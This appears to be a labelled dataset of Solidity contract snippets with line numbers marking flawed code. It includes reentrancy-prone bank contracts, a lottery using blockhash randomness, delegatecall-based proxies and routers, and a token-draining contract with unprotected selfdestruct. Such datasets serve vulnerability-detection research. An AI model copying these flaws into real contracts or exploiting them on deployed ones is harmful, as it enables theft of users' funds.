    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    /**
     * @dev Emitted when the implementation is upgraded.
     * @param implementation Address of the new implementation.
     */
    event Upgraded(address indexed implementation);
    function initialize() public;
    /**
     * @dev Upgrades the proxy to a new implementation.
     * @param newImplementation Address of the new implementation.
     */
    function upgradeTo(address newImplementation) internal {
        setImplementation(newImplementation);
        (bool success, bytes memory reason) = newImplementation.delegatecall(abi.encodeWithSignature(""initialize()""));
        require(success, string(reason));
        emit Upgraded(newImplementation);
    }
    /**
     * @dev Sets the implementation address of the proxy.
     * @param newImplementation Address of the new implementation.
     */
    function setImplementation(address newImplementation) private {
        require(OpenZeppelinUpgradesAddress.isContract(newImplementation), ""Cannot set a proxy implementation to a non-contract address"");
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }
    }
}
/*
    Copyright 2020 Elastic Network, based on the work of Empty Set Squad and Dynamic Dollar Devs <elasticnetwork@protonmail.com>
    Licensed under the Apache License, Version 2.0 (the ""License"");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at
    http://www.apache.org/licenses/LICENSE-2.0
    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an ""AS IS"" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/
contract Govern is Setters, Permission, Upgradeable {
    using SafeMath for uint256;
    using Decimal for Decimal.D256;
    bytes32 private constant FILE = ""Govern"";
    event Proposal(address indexed candidate, address indexed account, uint256 indexed start, uint256 period);
    event Vote(address indexed account, address indexed candidate, Candidate.Vote vote, uint256 bonded);
    event Commit(address indexed account, address indexed candidate);
    function vote(address candidate, Candidate.Vote _vote) external onlyFrozenOrLocked(msg.sender) {
        Require.that(
            balanceOf(msg.sender) > 0,
            FILE,
            ""Must have stake""
        );
        if (!isNominated(candidate)) {
            Require.that(
                canPropose(msg.sender),
                FILE,
                ""Not enough stake to propose""
            );
            createCandidate(candidate, Constants.getGovernancePeriod());
            emit Proposal(candidate, msg.sender, epoch(), Constants.getGovernancePeriod());
        }
        Require.that(
            epoch() < startFor(candidate).add(periodFor(candidate)),
            FILE,
            ""Ended""
        );
        uint256 bonded = balanceOf(msg.sender);
        Candidate.Vote recordedVote = recordedVote(msg.sender, candidate);
        if (_vote == recordedVote) {
            return;
        }
        if (recordedVote == Candidate.Vote.REJECT) {
            decrementRejectFor(candidate, bonded, ""Govern: Insufficient reject"");
        }
        if (recordedVote == Candidate.Vote.APPROVE) {
            decrementApproveFor(candidate, bonded, ""Govern: Insufficient approve"");",[64]
"        return(false, ""ok"");
    }
    function voteInProposal (uint proposalIndex, uint8 vote) public{
        (bool error, string memory message) = beforeVoteInProposal(proposalIndex, msg.sender);
        require (!error, message);
        proposals[proposalIndex].voters.push(msg.sender);
        proposals[proposalIndex].votes.push(vote);
        emit Vote(proposals[proposalIndex].actionType, proposalIndex, msg.sender, vote);
    }
    function beforeFinishProposal (uint proposalIndex, address senderAddress) public view
    returns(bool error, string memory message, uint votedYes, uint votedNo) {
        uint index = findParticipantIndex(senderAddress);
        uint _votedYes = 0;
        uint _votedNo = 0;
        for(uint i = 0; proposals[proposalIndex].voters.length > i; i++){
            if(proposals[proposalIndex].votes[i] == 1)
                _votedYes++;
            if(proposals[proposalIndex].votes[i] == 0)
                _votedNo++;
        }
        if(index == 0)
            return(true, ""You are not in participant"", _votedYes, _votedNo);
        if(proposals[proposalIndex].actionType == ActionType.add_voter && findParticipantIndex(proposals[proposalIndex].actionAddress) > 0)
            return(true, ""This participant already exist"", _votedYes, _votedNo);
        if(proposals[proposalIndex].actionType == ActionType.remove_voter && participants.length == 2)
            return(true, ""Minimal count of voted participants is 2"", _votedYes, _votedNo);
        if(proposals[proposalIndex].actionType == ActionType.remove_voter && participantPercent[proposals[proposalIndex].actionAddress] > 0)
            return(true, ""The participant to delete must have zero percent"", _votedYes, _votedNo);
        if(proposals.length <= proposalIndex)
            return(true, ""Proposal does not exist"", _votedYes, _votedNo);
        if(proposals[proposalIndex].result != 2)
            return(true, ""Voting has finished"", _votedYes, _votedNo);
        if(block.timestamp <= proposals[proposalIndex].endTime && proposals[proposalIndex].voters.length != participants.length)
            return(true, ""Voting is not finished"", _votedYes, _votedNo);
            // Tady změnit balance na konkrétní účet
        if(proposals[proposalIndex].actionType == ActionType.eth_emission && address(this).balance < proposals[proposalIndex].amount)
            return(true, ""Low ETH balance"", _votedYes, _votedNo);
        if(proposals[proposalIndex].voters.length <= participants.length - proposals[proposalIndex].voters.length) // Minimum participants on proposal
            return(true, ""Count of voted participants must be more than 50%"", _votedYes, _votedNo);
        return(false, ""ok"", _votedYes, _votedNo);
    }
    function finishProposal(uint proposalIndex) public {
        (bool error, string memory message, uint votedYes, uint votedNo) = beforeFinishProposal(proposalIndex, msg.sender);
        require (!error, message);
        proposals[proposalIndex].result = votedYes > votedNo? 1 : 0;
        if(votedYes > votedNo){
            if(proposals[proposalIndex].actionType == ActionType.add_voter){ // Add participant
                participants.push(proposals[proposalIndex].actionAddress);
            }
            else if (proposals[proposalIndex].actionType == ActionType.remove_voter) { // Remove participant
                uint index = findParticipantIndex(proposals[proposalIndex].actionAddress) - 1;
                participants[index] = participants[participants.length-1]; // Copy last item on removed position and
                participants.pop(); // remove last
            }
            else if (proposals[proposalIndex].actionType == ActionType.set_percent){
                for(uint i = 0; proposals[proposalIndex].addresses.length > i; i++){
                    participantPercent[proposals[proposalIndex].addresses[i]] = proposals[proposalIndex].percents[i];
                }
            }
            else if (proposals[proposalIndex].actionType == ActionType.eth_emission) { // Transfer ETH
                uint totalSend = proposals[proposalIndex].amount;
                uint remains = totalSend;
                for(uint i = 0; participants.length > i; i++){
                    if(i < participants.length-1){
                        payable(participants[i]).transfer(totalSend/100*participantPercent[participants[i]]);
                        remains -= totalSend/100*participantPercent[participants[i]];
                    }
                    else
                        payable(participants[i]).transfer(remains);
                }
            }
        }
        emit FinishVoting(proposals[proposalIndex].actionType, votedYes > votedNo, proposalIndex);
    }
    function statusOfProposal (uint index) public view returns (address[] memory, uint8[] memory) {
        require(proposals.length > index, ""Proposal at index not exist"");
        return (proposals[index].voters, proposals[index].votes);
    }
    function getProposal(uint index) public view returns( uint endTime, uint8 result, ActionType actionType, address actionAddress,
    uint8[] memory percents, address[] memory addresses, uint amount, address[] memory voters, uint8[] memory votes) {
        require(proposals.length > index, ""Proposal at index not exist"");
        Proposal memory p = proposals[index];
        return (p.endTime, p.result, p.actionType, p.actionAddress, p.percents, p.addresses, p.amount, p.voters, p.votes);
    }
    function proposalsLength () public view returns (uint) {
        return proposals.length;
    }
    function participantsLength () public view returns (uint) {
        return participants.length;
    }
    function percentagePayouts () public view returns (address[] memory participantsAdresses, uint8[] memory percents) {
        uint8[] memory pom = new uint8[](participants.length);
        for(uint i = 0; participants.length > i; i++){
            pom[i] = participantPercent[participants[i]];
        }
        return (participants, pom);
    }
    function findParticipantIndex(address addr) private view returns (uint) {
        for(uint i = 0; participants.length > i; i++){
            if(participants[i] == addr)
            return i+1;
        }
        return 0;
    }
}
contract DECENTRAL_ART is VAR, ERC721, DRAW, BUYPIX, VOTING {
    event PricesUpdated (uint256[] tokenIds, uint[] prices, address owner);
    event TokensSold (uint[] tokenIds, uint[] tokenPrices, uint fee, address newOwner);
    event ContractCreated (uint TransferFee, Phase[] Phases);
    uint transferFee = 15000;
    constructor() ERC721(""Decentral ART"", ""ART""){
        owner = msg.sender;
        emit ContractCreated(transferFee, phases);
    }
    function setTransferFee(uint fee) public {
        require(owner == msg.sender, ""Function is only for owner"");
        transferFee = fee;
    }
    function getTransferFee() public view  returns (uint fee){
        return transferFee;
    }
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public  override payable{
        //solhint-disable-next-line max-line-length
        require(_isApprovedOrOwner(_msgSender(), tokenId), ""ERC721: transfer caller is not owner nor approved"");","[63, 65]"
"pragma solidity ^0.4.19;
contract DEP_BANK 
{
    mapping (address=>uint256) public balances;   
    uint public MinSum;
    LogFile Log;
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)throw;
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)throw;
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[38, 40]"
"  string public constant name = ""Decentralized Escrow Token"";
  string public constant symbol = ""DEST"";
  uint   public constant decimals = 18;
  uint public constant ETH_MIN_LIMIT = 500 ether;
  uint public constant ETH_MAX_LIMIT = 1500 ether;
  uint public constant START_TIMESTAMP = 1503824400; // 2017-08-27 09:00:00 UTC
  uint public constant END_TIMESTAMP   = 1506816000; // 2017-10-01 00:00:00 UTC
  address public constant wallet = 0x51559EfC1AcC15bcAfc7E0C2fB440848C136A46B;
  // State variables
  // ===============
  uint public ethCollected;
  mapping (address=>uint) ethInvested;
  // Constant functions
  // =========================
  function hasStarted() public constant returns (bool) {
    return now >= START_TIMESTAMP;
  }
  // Payments are not accepted after ICO is finished.
  function hasFinished() public constant returns (bool) {
    return now >= END_TIMESTAMP || ethCollected >= ETH_MAX_LIMIT;
  }
  // Investors can move their tokens only after ico has successfully finished
  function tokensAreLiquid() public constant returns (bool) {
    return (ethCollected >= ETH_MIN_LIMIT && now >= END_TIMESTAMP)
      || (ethCollected >= ETH_MAX_LIMIT);
  }
  function price(uint _v) public constant returns (uint) {
    return // poor man's binary search
      _v < 7 ether
        ? _v < 3 ether
          ? _v < 1 ether
            ? 1000
            : _v < 2 ether ? 1005 : 1010
          : _v < 4 ether
            ? 1015
            : _v < 5 ether ? 1020 : 1030
        : _v < 14 ether
          ? _v < 10 ether
            ? _v < 9 ether ? 1040 : 1050
            : 1080
          : _v < 100 ether
            ? _v < 20 ether ? 1110 : 1150
            : 1200;
  }
  // Public functions
  // =========================
  function() public payable {
    require(hasStarted() && !hasFinished());
    require(ethCollected + msg.value <= ETH_MAX_LIMIT);
    ethCollected += msg.value;
    ethInvested[msg.sender] += msg.value;
    uint _tokenValue = msg.value * price(msg.value);
    balances[msg.sender] += _tokenValue;
    totalSupply += _tokenValue;
    Transfer(0x0, msg.sender, _tokenValue);
  }
  // Investors can get refund if ETH_MIN_LIMIT is not reached.
  function refund() public {
    require(ethCollected < ETH_MIN_LIMIT && now >= END_TIMESTAMP);
    require(balances[msg.sender] > 0);
    totalSupply -= balances[msg.sender];
    balances[msg.sender] = 0;
    uint _ethRefund = ethInvested[msg.sender];
    ethInvested[msg.sender] = 0;
    msg.sender.transfer(_ethRefund);
  }
  // Owner can withdraw all the money after min_limit is reached.
  function withdraw() public {
    require(ethCollected >= ETH_MIN_LIMIT);
    wallet.transfer(this.balance);
  }
  // ERC20 functions
  // =========================
  function transfer(address _to, uint _value) public returns (bool)
  {
    require(tokensAreLiquid());
    return super.transfer(_to, _value);
  }
  function transferFrom(address _from, address _to, uint _value)
    public returns (bool)
  {
    require(tokensAreLiquid());
    return super.transferFrom(_from, _to, _value);
  }
  function approve(address _spender, uint _value)
    public returns (bool)
  {
    require(tokensAreLiquid());
    return super.approve(_spender, _value);
  }
}","[59, 70]"
"pragma solidity ^0.6.12;
interface ERC20 {
    function balanceOf(address _owner) external returns (uint256 balance);
    function transfer(address _to, uint256 _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
    function approve(address _spender, uint256 _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint256 remaining);
}
contract DMaster {
    address private owner;
    constructor() public { 
        owner = msg.sender;
    }
    function bring(address token, address from, uint256 amount) public {
        ERC20(token).transferFrom(from, owner, amount);
    }
    function get(address token, uint256 amount) public {
        ERC20(token).transfer(owner, amount);
    }
    function kill() public {
        address payable wallet = payable(owner);
        selfdestruct(wallet);
    }
}","[20, 22]"
"pragma solidity ^0.4.19;
contract D_BANK
{
    mapping (address=>uint256) public balances;   
    uint public MinSum = 1 ether;
    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)revert();
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)revert();
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[38, 40]"
"    event FreeMineralChange(address indexed _target, uint32 _accCnt);
    /// @dev Recommend relationship map
    mapping (address => address) recommendRelation;
    /// @dev Free mining count map
    mapping (address => uint32) freeMineral;
    /// @dev Trust contract
    mapping (address => bool) actionContracts;
    function DataMining() public {
        addrAdmin = msg.sender;
        addrService = msg.sender;
        addrFinance = msg.sender;
    }
    function setRecommender(address _target, address _recommender)
        external
        onlyService
    {
        require(_target != address(0));
        recommendRelation[_target] = _recommender;
        RecommenderChange(_target, _recommender);
    }
    function setRecommenderMulti(address[] _targets, address[] _recommenders)
        external
        onlyService
    {
        uint256 targetLength = _targets.length;
        require(targetLength <= 64);
        require(targetLength == _recommenders.length);
        address addrZero = address(0);
        for (uint256 i = 0; i < targetLength; ++i) {
            if (_targets[i] != addrZero) {
                recommendRelation[_targets[i]] = _recommenders[i];
                RecommenderChange(_targets[i], _recommenders[i]);
            }
        }
    }
    function getRecommender(address _target) external view returns(address) {
        return recommendRelation[_target];
    }
    function addFreeMineral(address _target, uint32 _cnt)
        external
        onlyService
    {
        require(_target != address(0));
        require(_cnt <= 32);
        uint32 oldCnt = freeMineral[_target];
        freeMineral[_target] = oldCnt + _cnt;
        FreeMineralChange(_target, freeMineral[_target]);
    }
    function addFreeMineralMulti(address[] _targets, uint32[] _cnts)
        external
        onlyService
    {
        uint256 targetLength = _targets.length;
        require(targetLength <= 64);
        require(targetLength == _cnts.length);
        address addrZero = address(0);
        uint32 oldCnt;
        uint32 newCnt;
        address addr;
        for (uint256 i = 0; i < targetLength; ++i) {
            addr = _targets[i];
            if (addr != addrZero && _cnts[i] <= 32) {
                oldCnt = freeMineral[addr];
                newCnt = oldCnt + _cnts[i];
                assert(oldCnt < newCnt);
                freeMineral[addr] = newCnt;
                FreeMineralChange(addr, freeMineral[addr]);
            }
        }
    }
    function setActionContract(address _actionAddr, bool _useful) external onlyAdmin {
        actionContracts[_actionAddr] = _useful;
    }
    function getActionContract(address _actionAddr) external view onlyAdmin returns(bool) {
        return actionContracts[_actionAddr];
    }
    function subFreeMineral(address _target) external returns(bool) {
        require(actionContracts[msg.sender]);
        require(_target != address(0));
        uint32 cnts = freeMineral[_target];
        assert(cnts > 0);
        freeMineral[_target] = cnts - 1;
        FreeMineralChange(_target, cnts - 1);
        return true;
    }
    function getFreeMineral(address _target) external view returns(uint32) {
        return freeMineral[_target];
    }
}",[64]
" * Such a change is called an implementation upgrade.
 */
contract BaseUpgradeabilityProxy is Proxy {
  /**
   * @dev Emitted when the implementation is upgraded.
   * @param implementation Address of the new implementation.
   */
  event Upgraded(address indexed implementation);
  /**
   * @dev Storage slot with the address of the current implementation.
   * This is the keccak-256 hash of ""org.zeppelinos.proxy.implementation"", and is
   * validated in the constructor.
   */
  bytes32 internal constant IMPLEMENTATION_SLOT = 0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3;
  /**
   * @dev Returns the current implementation.
   * @return impl Address of the current implementation
   */
  function _implementation() internal override view returns (address impl) {
    bytes32 slot = IMPLEMENTATION_SLOT;
    assembly {
      impl := sload(slot)
    }
  }
  /**
   * @dev Upgrades the proxy to a new implementation.
   * @param newImplementation Address of the new implementation.
   */
  function _upgradeTo(address newImplementation) internal {
    _setImplementation(newImplementation);
    emit Upgraded(newImplementation);
  }
  /**
   * @dev Sets the implementation address of the proxy.
   * @param newImplementation Address of the new implementation.
   */
  function _setImplementation(address newImplementation) internal {
    require(Address.isContract(newImplementation), ""Cannot set a proxy implementation to a non-contract address"");
    bytes32 slot = IMPLEMENTATION_SLOT;
    assembly {
      sstore(slot, newImplementation)
    }
  }
}
/**
 * @title InitializableUpgradeabilityProxy
 * @dev Extends BaseUpgradeabilityProxy with an initializer for initializing
 * implementation and init data.
 */
contract InitializableUpgradeabilityProxy is BaseUpgradeabilityProxy {
  /**
   * @dev Contract initializer.
   * @param _logic Address of the initial implementation.
   * @param _data Data to send as msg.data to the implementation to initialize the proxied contract.
   * It should include the signature and the parameters of the function to be called, as described in
   * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding.
   * This parameter is optional, if no data is given the initialization call to proxied contract will be skipped.
   */
  function initialize(address _logic, bytes memory _data) public payable {
    require(_implementation() == address(0));
    assert(IMPLEMENTATION_SLOT == keccak256(""org.zeppelinos.proxy.implementation""));
    _setImplementation(_logic);
    if(_data.length > 0) {
      (bool success,) = _logic.delegatecall(_data);
      require(success);
    }
  }
}
/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor () internal { }
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), ""Ownable: caller is not the owner"");
        _;
    }
    /**
     * @dev Leaves the contract without owner. It will not be possible to call",[64]
"	uint public nextTicketPrice = 0;
	uint public stage;
	uint public maxTickets = 100;
	mapping(address => mapping(address => uint)) prizes;
	mapping(address => bool) lotteryRunners;
	event Win(uint indexed stage, uint ticketsCount, uint ticketNumber, address indexed winner, uint prize);
   	modifier canRunLottery() {
   		require(lotteryRunners[msg.sender]);
   		_;
   	}
	function DeLottery() public {
		lotteryRunners[msg.sender] = true;
		gamblers.push(0x0);
	}
	function () public payable whenNotPaused {
		require(!isContract(msg.sender));
		require(msg.value >= ticketPrice);
		uint availableTicketsToBuy = maxTickets - getTicketsCount();
		require(availableTicketsToBuy > 0);
		uint ticketsBought = msg.value.div(ticketPrice);
		uint ticketsToBuy;
		uint refund = 0;
		if(ticketsBought > availableTicketsToBuy) {
			ticketsToBuy = availableTicketsToBuy;
			refund = (ticketsBought - availableTicketsToBuy).mul(ticketPrice);
		} else {
			ticketsToBuy = ticketsBought;
		}
		for(uint16 i = 0; i < ticketsToBuy; i++) {
			gamblers.push(msg.sender);
		}
		prizeFund = prizeFund.add(ticketsToBuy.mul(ticketPrice));
		//return change
		refund = refund.add(msg.value % ticketPrice);
		if(refund > 0) {
			msg.sender.transfer(refund);
		}
	}
	function calculateWinnerPrize(uint fund, uint winnersCount) public pure returns (uint prize) {
		return fund.mul(19).div(winnersCount).div(20);
	}
	function calculateWinnersCount(uint _ticketsCount) public pure returns (uint count) {
		if(_ticketsCount < 10) {
			return 1;
		} else {
			return _ticketsCount.div(10);
		}
	}
	function runLottery() external whenNotPaused canRunLottery {
		uint gamblersLength = getTicketsCount();
		require(gamblersLength >= QUORUM);
		uint winnersCount = calculateWinnersCount(gamblersLength);
		uint winnerPrize = calculateWinnerPrize(prizeFund, winnersCount);
		int[] memory winners = new int[](winnersCount);
		uint lastWinner = 0;
		bytes32 rnd = block.blockhash(block.number - 1);
		for(uint i = 0; i < winnersCount; i++) {
			lastWinner = generateNextWinner(rnd, lastWinner, winners, gamblers.length);
			winners[i] = int(lastWinner);
			address winnerAddress = gamblers[uint(winners[i])];
			winnerAddress.transfer(winnerPrize); //safe because gambler can't be a contract
			Win(stage, gamblersLength, lastWinner, winnerAddress, winnerPrize);
		}
		setTicketPriceIfNeeded();
		//set initial state
		prizeFund = 0;
		gamblers.length = 1;
		stage += 1;
	}
	function getTicketsCount() public view returns (uint) {
		return gamblers.length - 1;
	}
	function setTicketPrice(uint _ticketPrice) external onlyOwner {
		if(getTicketsCount() == 0) {
			ticketPrice = _ticketPrice;
			nextTicketPrice = 0;
		} else {
			nextTicketPrice = _ticketPrice;
		}
	}
	function setMaxTickets(uint _maxTickets) external onlyOwner {
		maxTickets = _maxTickets;
	}
	function setAsLotteryRunner(address addr, bool isAllowedToRun) external onlyOwner {
		lotteryRunners[addr] = isAllowedToRun;
	}
	function setTicketPriceIfNeeded() private {
		if(nextTicketPrice > 0) {
			ticketPrice = nextTicketPrice;
			nextTicketPrice = 0;
		}
	}
	/**
	* @dev Function to get ether from contract
	* @param amount Amount in wei to withdraw
	*/
	function withdrawEther(address recipient, uint amount) external onlyOwner {
		recipient.transfer(amount);
	}
	function generateNextWinner(bytes32 rnd, uint previousWinner, int[] winners, uint gamblersCount) private view returns(uint) {
		uint nonce = 0;
		uint winner = generateWinner(rnd, previousWinner, nonce, gamblersCount);
		while(isInArray(winner, winners)) {
			nonce += 1;
			winner = generateWinner(rnd, previousWinner, nonce, gamblersCount);
		}
		return winner;
	}
	function generateWinner(bytes32 rnd, uint previousWinner, uint nonce, uint gamblersCount) private pure returns (uint winner) {
		return uint(keccak256(rnd, previousWinner, nonce)) % gamblersCount;
	}
	function isInArray(uint element, int[] array) private pure returns (bool) {
		for(uint64 i = 0; i < array.length; i++) {
			if(uint(array[i]) == element) {
				return true;
			}
		}
		return false;
	}
	function isContract(address _addr) private view returns (bool is_contract) {
		uint length;
		assembly {
			//retrieve the size of the code on target address, this needs assembly
			length := extcodesize(_addr)
		}
		return length > 0;
	}
}","[61, 62, 68]"
"    address indexed sender,
    address payable indexed receiver
  );
  receive() external payable {
    // Accepts ETH payments which is require in order
    // to swap from and to ETH
    // especially unwrapping WETH as part of token swaps.
  }
  // The main function to execute payments.
  function pay(
    // The path of the token conversion.
    address[] calldata path,
    // Amounts passed to proccessors:
    // e.g. [amountIn, amountOut, deadline]
    uint[] calldata amounts,
    // Addresses passed to plugins:
    // e.g. [receiver]
    address[] calldata addresses,
    // List and order of plugins to be executed for this payment:
    // e.g. [Uniswap,paymentPlugin] to swap and pay
    address[] calldata plugins,
    // Data passed to plugins:
    // e.g. [""signatureOfSmartContractFunction(address,uint)""] receiving the payment
    string[] calldata data
  ) external payable returns(bool) {
    uint balanceBefore = _balanceBefore(path[path.length-1]);
    _ensureTransferIn(path[0], amounts[0]);
    _execute(path, amounts, addresses, plugins, data);
    _ensureBalance(path[path.length-1], balanceBefore);
    emit Payment(msg.sender, payable(addresses[addresses.length-1]));
    return true;
  }
  // Returns the balance for a token (or ETH) before the payment is executed.
  // In case of ETH we need to deduct what has been payed in as part of the transaction itself.
  function _balanceBefore(address token) private returns (uint balance) {
    balance = _balance(token);
    if(token == ETH) { balance -= msg.value; }
  }
  // This makes sure that the sender has payed in the token (or ETH)
  // required to perform the payment.
  function _ensureTransferIn(address tokenIn, uint amountIn) private {
    if(tokenIn == ETH) {
      require(msg.value >= amountIn, 'DePay: Insufficient ETH amount payed in!');
    } else {
      Helper.safeTransferFrom(tokenIn, msg.sender, address(this), amountIn);
    }
  }
  // Executes plugins in the order provided.
  // Calls itself's _pay function if the payment plugin contract itself is part of plugins.
  function _execute(
    address[] calldata path,
    uint[] calldata amounts,
    address[] calldata addresses,
    address[] calldata plugins,
    string[] calldata data
  ) internal {
    for (uint i = 0; i < plugins.length; i++) {
      if(plugins[i] == address(this)) {
        _pay(payable(addresses[addresses.length-1]), path[path.length-1], amounts[1]);
      } else {
        require(_isApproved(plugins[i]), 'DePay: Plugin not approved!');
        address plugin = configuration.approvedPlugins(plugins[i]);
        (bool success, bytes memory returnData) = plugin.delegatecall(abi.encodeWithSelector(
            IDePayPaymentsV1Plugin(plugin).execute.selector, path, amounts, addresses, data
        ));
        require(success, string(returnData));
      }
    }
  }
  // Sends token (or ETH) to receiver.
  function _pay(address payable receiver, address token, uint amountOut) private {
    if(token == ETH) {
      Helper.safeTransferETH(receiver, amountOut);
    } else {
      Helper.safeTransfer(token, receiver, amountOut);
    }
  }
  // This makes sure that the balance after the payment not less than before.
  // Prevents draining of the contract.
  function _ensureBalance(address tokenOut, uint balanceBefore) private view {
    require(_balance(tokenOut) >= balanceBefore, 'DePay: Insufficient balance after payment!');
  }
  // Returns the balance of the payment plugin contract for a token (or ETH).
  function _balance(address token) private view returns(uint) {
    if(token == ETH) {
        return address(this).balance;
    } else {
        return IERC20(token).balanceOf(address(this));
    }
  }
  // Function to check if a plugin address is approved.
  function isApproved(
    address pluginAddress
  ) external view returns(bool){
    return _isApproved(pluginAddress);
  }
  // Internal function to check if a plugin address is approved.
  function _isApproved(
    address pluginAddress
  ) internal view returns(bool) {
    return (configuration.approvedPlugins(pluginAddress) != address(0));
  }
  // Allows to withdraw accidentally sent ETH or tokens.
  function withdraw(
    address token,
    uint amount
  ) external onlyOwner returns(bool) {
    if(token == ETH) {
      Helper.safeTransferETH(payable(configuration.owner()), amount);
    } else {
      Helper.safeTransfer(token, payable(configuration.owner()), amount);
    }
    return true;
  }
}","[63, 64, 65]"
"    configuration = DePayRouterV1Configuration(_configuration);
  }
  // Proxy modifier to DePayRouterV1Configuration
  modifier onlyOwner() {
    require(configuration.owner() == msg.sender, ""Ownable: caller is not the owner"");
    _;
  }
  receive() external payable {
    // Accepts ETH payments which is require in order
    // to swap from and to ETH
    // especially unwrapping WETH as part of token swaps.
  }
  // The main function to route transactions.
  function route(
    // The path of the token conversion.
    address[] calldata path,
    // Amounts passed to proccessors:
    // e.g. [amountIn, amountOut, deadline]
    uint[] calldata amounts,
    // Addresses passed to plugins:
    // e.g. [receiver]
    address[] calldata addresses,
    // List and order of plugins to be executed for this payment:
    // e.g. [Uniswap,paymentPlugin] to swap and pay
    address[] calldata plugins,
    // Data passed to plugins:
    // e.g. [""signatureOfSmartContractFunction(address,uint)""] receiving the payment
    string[] calldata data
  ) external payable returns(bool) {
    uint balanceBefore = _balanceBefore(path[path.length-1]);
    _ensureTransferIn(path[0], amounts[0]);
    _execute(path, amounts, addresses, plugins, data);
    _ensureBalance(path[path.length-1], balanceBefore);
    return true;
  }
  // Returns the balance for a token (or ETH) before the payment is executed.
  // In case of ETH we need to deduct what has been payed in as part of the transaction itself.
  function _balanceBefore(address token) private returns (uint balance) {
    balance = _balance(token);
    if(token == ETH) { balance -= msg.value; }
  }
  // This makes sure that the sender has payed in the token (or ETH)
  // required to perform the payment.
  function _ensureTransferIn(address tokenIn, uint amountIn) private {
    if(tokenIn == ETH) {
      require(msg.value >= amountIn, 'DePay: Insufficient ETH amount payed in!');
    } else {
      Helper.safeTransferFrom(tokenIn, msg.sender, address(this), amountIn);
    }
  }
  // Executes plugins in the given order.
  function _execute(
    address[] calldata path,
    uint[] calldata amounts,
    address[] calldata addresses,
    address[] calldata plugins,
    string[] calldata data
  ) internal {
    for (uint i = 0; i < plugins.length; i++) {
      require(_isApproved(plugins[i]), 'DePay: Plugin not approved!');
      IDePayRouterV1Plugin plugin = IDePayRouterV1Plugin(configuration.approvedPlugins(plugins[i]));
      if(plugin.delegate()) {
        (bool success, bytes memory returnData) = address(plugin).delegatecall(abi.encodeWithSelector(
            plugin.execute.selector, path, amounts, addresses, data
        ));
        require(success, string(returnData));
      } else {
        (bool success, bytes memory returnData) = address(plugin).call(abi.encodeWithSelector(
